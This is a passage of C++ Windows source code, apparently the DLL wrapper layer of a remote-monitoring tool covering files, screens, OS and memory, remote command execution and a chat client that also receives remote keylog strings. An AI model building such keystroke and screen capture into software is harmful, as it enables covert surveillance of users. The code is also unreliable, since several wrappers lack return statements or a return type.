	return RegisterFileMonitor(ptrToFileMonitor);
}

int RemoveFileMonitor(UINT64  Address)
{
	 try
	 {
			WaitForSingleObject(m_MuxFileMonitor,INFINITE); 
			try
			{
				 CFileMonitor *ptrToFileMonitor=(CFileMonitor*)Address; 
				 if(ptrToFileMonitor) try { delete ptrToFileMonitor; } catch(...) {}
			}
		    catch(...) {}
			ReleaseMutex(m_MuxFileMonitor);
			return 1;
	 }
    catch(...) { return 0;	 }
}

CFileMonitor  *GetFileMonitorByAddress(UINT64  Address)
{
	 try
	 {
			WaitForSingleObject(m_MuxFileMonitor,INFINITE);    
				 CFileMonitor *ptrToFileMonitor=(CFileMonitor*)Address; 
			ReleaseMutex(m_MuxFileMonitor);
		  return ptrToFileMonitor;
	 }
	 catch(...) { return 0; }
}

int CFMSetFileDataStream(UINT64  Address,BYTE *FileDataStream,UINT32 LengthOfBytes)
{
	CFileMonitor *ptrToFileMonitor=GetFileMonitorByAddress(Address);
	if(ptrToFileMonitor) return ptrToFileMonitor->SetFileDataStream(FileDataStream,LengthOfBytes);
	return 0;
}

int CFMSetFileDataStreamEx(UINT64  Address,UINT64 CmdMonitorAddress)
{
	CFileMonitor *ptrToFileMonitor=GetFileMonitorByAddress(Address);
	if(ptrToFileMonitor) return ptrToFileMonitor->SetFileDataStream((CCommandMonitorClient*)CmdMonitorAddress);
	return 0;
}

int CFMGetFirstFile(UINT64  Address,TCHAR *FileInfo,BYTE InfoLevel,UINT32 &ResultLength)
{
	CFileMonitor *ptrToFileMonitor=GetFileMonitorByAddress(Address);
	if(ptrToFileMonitor) return ptrToFileMonitor->GetFirstFile(FileInfo,InfoLevel,ResultLength);
	return 0;
}

int CFMGetCurrentFileSize(UINT64  Address,UINT32 &FileSize)
{
	CFileMonitor *ptrToFileMonitor=GetFileMonitorByAddress(Address);
	if(ptrToFileMonitor) return (int)(ptrToFileMonitor->GetCurrentFileSize(FileSize));
	return 0;
}


int CFMGetCurrentFile(UINT64  Address,TCHAR *FileInfo,BYTE InfoLevel,UINT32 &ResultLength)
{
	CFileMonitor *ptrToFileMonitor=GetFileMonitorByAddress(Address);
	if(ptrToFileMonitor) return ptrToFileMonitor->GetCurrentFile(FileInfo,InfoLevel,ResultLength);
	return 0;
}

int CFMGetNextFile (UINT64  Address,TCHAR *FileInfo,BYTE InfoLevel,UINT32 &ResultLength)
{
	CFileMonitor *ptrToFileMonitor=GetFileMonitorByAddress(Address);
	if(ptrToFileMonitor) return ptrToFileMonitor->GetNextFile(FileInfo,InfoLevel,ResultLength);
	return 0;
}

long CFMGetNumberOfFiles(UINT64  Address)
{
	CFileMonitor *ptrToFileMonitor=GetFileMonitorByAddress(Address);
	if(ptrToFileMonitor) return ptrToFileMonitor->GetNumberOfFiles();
	return 0;
}

int CFMIsCurrentFileIsDir(UINT64  Address)
{
	CFileMonitor *ptrToFileMonitor=GetFileMonitorByAddress(Address);
	if(ptrToFileMonitor) return (int)(ptrToFileMonitor->IsCurrentFileIsDir());
	return 0;
}

int CFMGetCurrentFileType(UINT64  Address,BYTE &FileType)
{
	CFileMonitor *ptrToFileMonitor=GetFileMonitorByAddress(Address);
	if(ptrToFileMonitor) return ptrToFileMonitor->GetCurrentFileType(FileType);
	return 0;
}


//-------------Screen Monitor Messenger Functions---------//

UINT64 RegisterAsCScreenMonitorMessenger(void)
{
	WaitForSingleObject(m_MuxScreenMonitorMessenger,INFINITE); 
		CScreenMonitorMessenger *ptrToMessenger=new CScreenMonitorMessenger();
	ReleaseMutex(m_MuxScreenMonitorMessenger);
	return (UINT64)ptrToMessenger;
}

int RemoveScreenMonitorMessenger(UINT64 Address)
{
	try
	{
		WaitForSingleObject(m_MuxScreenMonitorMessenger,INFINITE);
		try
		{
			CScreenMonitorMessenger *ptrToMessenger=(CScreenMonitorMessenger*)Address;
			if(ptrToMessenger) try { delete ptrToMessenger; } catch(...) {}
		}
		catch(...) {}
		ReleaseMutex(m_MuxScreenMonitorMessenger);
		return 1;
	}
	catch(...) { return 0; }
}

int ScreenMonitorMessengerSetMessageType(UINT64 Address,BYTE MsgType,BYTE *MsgArgs,long ArgLen)
{
	CScreenMonitorMessenger *ptrToMessenger=(CScreenMonitorMessenger*)Address;
	if(ptrToMessenger) return ptrToMessenger->SetMessageType(MsgType,MsgArgs,ArgLen);
	else return 0;
}

//-------------WinMonitor Messenger Functions-------------//

UINT64 RegisterAsWinMonitorMessenger(UINT64 ConnectionAddress)
{
	WaitForSingleObject(m_MuxWinMonitorMessenger,INFINITE); 
	CWinMonitorMessenger *WinMsgr=0;
	try
	{	WinMsgr=new CWinMonitorMessenger((CTcpNwMonitorConnection*)ConnectionAddress);  }
	catch(...) { WinMsgr=0; }
	ReleaseMutex(m_MuxWinMonitorMessenger);
	return (UINT64)WinMsgr;
}

int RemoveWinMonitorMessenger(UINT64 Address)
{
	try
	{
		WaitForSingleObject(m_MuxWinMonitorMessenger,INFINITE);
		try
		{
			CWinMonitorMessenger *WinMsgr=(CWinMonitorMessenger*)Address;
			if(WinMsgr) try { delete WinMsgr; } catch(...) {}
		}
		catch(...) {}
		ReleaseMutex(m_MuxWinMonitorMessenger);
		return 1;
	}
	catch(...) { return 0; }
}

int WinMonitorMessengerSetConnection(UINT64  Address,UINT64 ConnectionAddress)
{
	CWinMonitorMessenger *WinMsgr=(CWinMonitorMessenger*)Address;
	if(WinMsgr) return (int)WinMsgr->SetConnection(*((CTcpNwMonitorConnection*)ConnectionAddress));  
	else return 0;
}

int WinMonitorMessengerSynchronizeServer(UINT64  Address,int FromServer)
{
	CWinMonitorMessenger *WinMsgr=(CWinMonitorMessenger*)Address;
	if(WinMsgr) return (int)WinMsgr->SynchronizeServer(FromServer);
	else return 0;
}

int WinMonitorMessengerAuthenticate(UINT64  Address,TCHAR *PassWord)
{
	CWinMonitorMessenger *WinMsgr=(CWinMonitorMessenger*)Address;
	if(WinMsgr) return (int)WinMsgr->Authenticate(PassWord);
	else return 0;
}

int WinMonitorMessengerRegisterType(UINT64  Address,BYTE ServiceType)
{
	CWinMonitorMessenger *WinMsgr=(CWinMonitorMessenger*)Address;
	if(WinMsgr) return (int)(WinMsgr->RegisterType(ServiceType)); 
	else return 0;
}

int WinMonitorMessengerExecuteCommandMonitorClient(UINT64  Address,UINT64 CommandMonitorClientAddress)
{
	CWinMonitorMessenger *WinMsgr=(CWinMonitorMessenger*)Address;
	if(WinMsgr) return (int)(WinMsgr->ExecuteCommandMonitorClient((CCommandMonitorClient*)CommandMonitorClientAddress)); 
	else return 0;
}

int WinMonitorMessengerExecuteScreenMonitorMessenger(UINT64  Address,UINT64 SMessengerAddress,UINT64 ScreenMonitorAddress)
{
	CWinMonitorMessenger *WinMsgr=(CWinMonitorMessenger*)Address;
	if(WinMsgr) return (int)WinMsgr->ExecuteScreenMonitorMessenger((CScreenMonitorMessenger*)SMessengerAddress,(CScreenMonitorBase*)ScreenMonitorAddress);   
	else return 0;
}

int WinMonitorMessengerShutDown(UINT64  Address)
{
	CWinMonitorMessenger *WinMsgr=(CWinMonitorMessenger*)Address;
	if(WinMsgr) return (int)WinMsgr->ShutDown();   
	else return 0;
}
//----------------CMainMemory & COsMonitor Functions--------------------------//

UINT64 RegisterAsMainMemoryMonitor(BYTE *MainMemoryInfoStream,TCHAR *TokenSeperator)
{
	WaitForSingleObject(m_MuxMainMemoryMonitor,INFINITE); 
	CMainMemoryMonitor  *MainMntr=0;
	try
	{	MainMntr=new CMainMemoryMonitor(MainMemoryInfoStream,TokenSeperator); }
	catch(...) { MainMntr=0; }
	ReleaseMutex(m_MuxMainMemoryMonitor);
	return (UINT64)MainMntr;
}

int RemoveMainMemoryMonitor(UINT64  Address)
{
	try
	{
		WaitForSingleObject(m_MuxMainMemoryMonitor,INFINITE); 
		try
		{
			CMainMemoryMonitor  *MainMntr=(CMainMemoryMonitor*)Address;
			if(MainMntr) try { delete MainMntr; } catch(...) {}
		}
		catch(...) {}
		ReleaseMutex(m_MuxMainMemoryMonitor);
		return 1;
	}
	catch(...) { return 0;}
}

int SetMemoryInfoStream(UINT64  Address,BYTE *MainMemoryInfoStream,TCHAR *TokenSeperator)
{
	CMainMemoryMonitor  *MainMntr=(CMainMemoryMonitor*)Address;
	if(MainMntr) return (int)MainMntr->SetMemoryInfoStream(MainMemoryInfoStream,TokenSeperator);
	else return 0;
}

int GetMainMemoryStatus(UINT64  Address,TCHAR *MainMemoryStatus,UINT32 &ResultLength)
{
	CMainMemoryMonitor  *MainMntr=(CMainMemoryMonitor*)Address;
	if(MainMntr) return (int)MainMntr->GetMainMemoryStatus(MainMemoryStatus,ResultLength);
	else return 0;
}

GetVirtualMemoryStatus(UINT64  Address,TCHAR *VirtualMemoryStatus,UINT32 &ResultLength)
{
	CMainMemoryMonitor  *MainMntr=(CMainMemoryMonitor*)Address;
	if(MainMntr) return (int)MainMntr->GetVirtualMemoryStatus(VirtualMemoryStatus,ResultLength);
	else return 0;
}


UINT64 RegisterAsOSMonitor(BYTE *OSInfoStream,TCHAR *TokenSeperator)
{
	WaitForSingleObject(m_MuxOSMonitor,INFINITE); 
	COSMonitor *OSMntr=0;
	try
	{	OSMntr=new COSMonitor(OSInfoStream,TokenSeperator); }
	catch(...) { OSMntr=0; }
	ReleaseMutex(m_MuxOSMonitor);
	return (UINT64)OSMntr;
}

int RemoveOSMonitor(UINT64  Address)
{
	try
	{
		WaitForSingleObject(m_MuxOSMonitor,INFINITE); 
		try
		{
			COSMonitor *OSMntr=(COSMonitor*)Address;
			if(OSMntr) try { delete OSMntr; } catch(...) {}
		}
		catch(...) {}
		ReleaseMutex(m_MuxOSMonitor);
		return 1;
	}
	catch(...) { return 0;}
}

int SetOSInfoStream(UINT64  Address,BYTE *OSInfoStream,TCHAR *TokenSeperator)
{
	COSMonitor *OSMntr=(COSMonitor*)Address;
	if(OSMntr) return (int)OSMntr->SetOSInfoStream(OSInfoStream,TokenSeperator); 
	else return 0;
}

int GetOSInformation(UINT64  Address,TCHAR *OSInfo,UINT32 &ResultLength)
{
	COSMonitor *OSMntr=(COSMonitor*)Address;
	if(OSMntr) return (int)OSMntr->GetOSInformation(OSInfo,ResultLength);
	else return 0;
}
//------------------Browse Folder--------------------//

int GetFolderName(TCHAR *Caption,TCHAR  **lpszFolderName,HWND hWnd)
{
	LPMALLOC pMalloc;

	if (SUCCEEDED(::SHGetMalloc(&pMalloc))) 
	{
		BROWSEINFO	 BrowseInfo;
		LPITEMIDLIST lpItemIdList;
		TCHAR		 szFolderName[MAX_PATH];
		TCHAR		 szDisplayName[MAX_PATH];
		TCHAR        *szCaption=new TCHAR[_tcslen(Caption)+1];
		
		try {_tcscpy(szCaption,Caption); } catch(...) { szCaption[0]='\0'; }

		szDisplayName[0] = '\0';
		szFolderName[0]  = '\0';
		::ZeroMemory(&BrowseInfo, sizeof(BrowseInfo));

		BrowseInfo.hwndOwner	  = hWnd;
		BrowseInfo.pidlRoot		  = NULL;
		BrowseInfo.pszDisplayName = szDisplayName;
		BrowseInfo.lpszTitle	  = szCaption;
		BrowseInfo.ulFlags		  = BIF_EDITBOX | BIF_VALIDATE;
		BrowseInfo.lParam		  = NULL;
		BrowseInfo.iImage		  = 0;

		if ((lpItemIdList = SHBrowseForFolder(&BrowseInfo)) != NULL)
		{
			if (SHGetPathFromIDList(lpItemIdList,(LPTSTR)szFolderName))
			{
				if (_tcslen(szFolderName))
				{
					pMalloc->Free(lpItemIdList);
					pMalloc->Release();
					*lpszFolderName=new TCHAR[_tcslen(szFolderName)+1];
					_tcscpy(_T(*lpszFolderName),_T(szFolderName));
					return 1;
				}
			}
		}
			
		pMalloc->Free(lpItemIdList);
		pMalloc->Release();
		*lpszFolderName=new TCHAR[1];
		_tcscpy(_T(*lpszFolderName),_T(""));
		return 0;
	}

	return 0;
}

HICON GetIconHandle(TCHAR *FileExtn)
{
	TCHAR *tchrExt;
	try
	{
		tchrExt=new TCHAR[4+_tcslen(FileExtn)+1];
		_tcscpy(tchrExt,_T("Foo."));
		_tcscat(tchrExt,FileExtn);
		SHFILEINFO shfi;
		memset(&shfi,0,sizeof(shfi));
		SHGetFileInfo(tchrExt,FILE_ATTRIBUTE_NORMAL,&shfi,sizeof(shfi),	SHGFI_ICON|SHGFI_USEFILEATTRIBUTES);
		delete[] tchrExt;
		return shfi.hIcon;
	}
	catch(...) { return 0; }
  }

//-----------------------------chat client---------------------------//

UINT64 RegisterAsChatClient(UINT64 ConnectionAddress)
{
	WaitForSingleObject(m_MuxChatClient,INFINITE); 
	CChatClient *chatClient=0;
	try
	{	chatClient=new CChatClient((CTcpNwMonitorConnection*)ConnectionAddress);  }
	catch(...) { chatClient=0; }
	ReleaseMutex(m_MuxChatClient);
	return (UINT64)chatClient;
}

int RemoveChatClient(UINT64 Address)
{
	try
	{
		WaitForSingleObject(m_MuxChatClient,INFINITE);
		try
		{
			CChatClient *chatClient=(CChatClient*)Address;
			if(chatClient) try { delete chatClient; } catch(...) {}
		}
		catch(...) {}
		ReleaseMutex(m_MuxChatClient);
		return 1;
	}
	catch(...) { return 0; }
}

int ChatClientSetConnection(UINT64  Address,UINT64 ConnectionAddress)
{
	CChatClient *chatClient=(CChatClient*)Address;
	if(chatClient) (int)(chatClient->SetConnection(*((CTcpNwMonitorConnection*)ConnectionAddress)));
	else return (int)0;
}

int ChatClientSynchronizeServer(UINT64  Address)
{
	CChatClient *chatClient=(CChatClient*)Address;
	if(chatClient) (int)(chatClient->SynchronizeServer());
	else return (int)0;
}

int ChatClientAuthenticate(UINT64  Address,TCHAR *PassWord)
{
	CChatClient *chatClient=(CChatClient*)Address;
	if(chatClient) (int)(chatClient->Authenticate(PassWord));
	else return (int)0;
}

int ChatClientRegisterType(UINT64  Address,BYTE ServiceType)
{
	CChatClient *chatClient=(CChatClient*)Address;
	if(chatClient) (int)(chatClient->RegisterType(ServiceType));
	else return (int)0;
}

int ChatClientShutDown(UINT64  Address)
{
	CChatClient *chatClient=(CChatClient*)Address;
	if(chatClient) (int)(chatClient->ShutDown());
	else return (int)0;
}

int ChatClientSendChatString(UINT64  Address,TCHAR *srcString)
{
	CChatClient *chatClient=(CChatClient*)Address;
	if(chatClient) (int)(chatClient->SendChatString(srcString));
	else return (int)0;
}

int ChatClientReceieveChatString(UINT64  Address,TCHAR *dstString,UINT32 &strLen)
{
	CChatClient *chatClient=(CChatClient*)Address;
	if(chatClient) (int)(chatClient->ReceieveChatString(dstString,strLen));
	else return (int)0;
}

int ChatClientReceieveOnLineKeyLogString(UINT64  Address,TCHAR *dstString,UINT32 &strLen)
{
	CChatClient *chatClient=(CChatClient*)Address;
	if(chatClient) (int)(chatClient->ReceieveOnLineKeyLogString(dstString,strLen));
	else return (int)0;
}